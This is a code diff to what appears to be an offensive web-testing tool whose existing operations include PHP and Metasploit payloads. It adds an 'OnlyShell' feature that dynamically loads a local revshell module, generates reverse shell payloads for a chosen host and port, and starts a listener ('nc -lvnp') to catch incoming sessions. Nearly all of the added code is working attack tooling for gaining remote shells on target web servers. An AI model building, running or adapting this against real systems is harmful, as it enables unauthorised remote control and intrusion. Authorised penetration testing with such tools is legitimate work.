@@ -27,7 +27,32 @@ import urllib.request
 import urllib.error
 import ssl
 import http.client
+import importlib.util as _ilu
 from pathlib import Path
+
+# ── OnlyShell reverse shell handler ──────────────────────────────────────────
+def _local_ip() -> str:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
+        return ip
+    except Exception:
+        return "0.0.0.0"
+
+_RS_MOD = None
+def _rs():
+    global _RS_MOD
+    if _RS_MOD is not None:
+        return _RS_MOD
+    for _c in [
+        Path(__file__).parent.parent / "network" / "revshell" / "revshell.py",
+        Path(__file__).parent / "revshell" / "revshell.py",
+    ]:
+        if _c.exists():
+            _s = _ilu.spec_from_file_location("revshell", _c)
+            _m = _ilu.module_from_spec(_s); _s.loader.exec_module(_m)
+            _RS_MOD = _m; return _m
+    return None
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass, field, asdict
@@ -2673,6 +2698,34 @@ exploit -j
         "jolokia", "jolokia/list", "h2-console",
     ]
 
+    def op_shell(self) -> Dict:
+        """OnlyShell handler: start reverse shell listener + generate web-appropriate payloads."""
+        section("REVERSE SHELL HANDLER")
+        lhost    = self.params.get('lhost') or _local_ip()
+        lport    = int(self.params.get('lport', 4444))
+        serve    = str(self.params.get('serve', 'true')).lower() in ('true', '1', 'yes')
+        duration = int(self.params.get('duration', 60))
+        ptype    = self.params.get('payload_type', 'all')
+        rs = _rs()
+        if rs is None:
+            self.errors.append("revshell module not found — check tools/network/revshell/")
+            return {'error': 'revshell module not found'}
+        gen = rs.op_generate(lhost=lhost, lport=lport, shell=ptype)
+        result = {
+            'lhost': lhost, 'lport': lport,
+            'listener': f"nc -lvnp {lport}",
+            'payloads': gen.get('payloads', {}),
+        }
+        info(f"Payloads generated for {lhost}:{lport} — listener: nc -lvnp {lport}")
+        info(f"Starting reverse shell handler…")
+        if serve:
+            rs.op_serve([lport], lhost=lhost)
+        else:
+            r = rs.op_listen([lport], duration=duration, lhost=lhost)
+            result.update({'sessions': r.get('sessions', []),
+                           'sessions_count': r.get('sessions_count', 0)})
+        return result
+
     def op_fuzz(self) -> Dict:
         """Directory/file fuzzing wrapper — auto-selects ffuf/gobuster/dirbuster."""
         section("DIRECTORY / FILE FUZZER")
@@ -3159,6 +3212,7 @@ exploit -j
             "stealth": self.op_stealth,
             "php_payload": self.op_php_payload,
             "msf_payload": self.op_msf_payload,
+            "shell":       self.op_shell,
             "fuzz": self.op_fuzz,
             "burp_export": self.op_burp_export,
         }
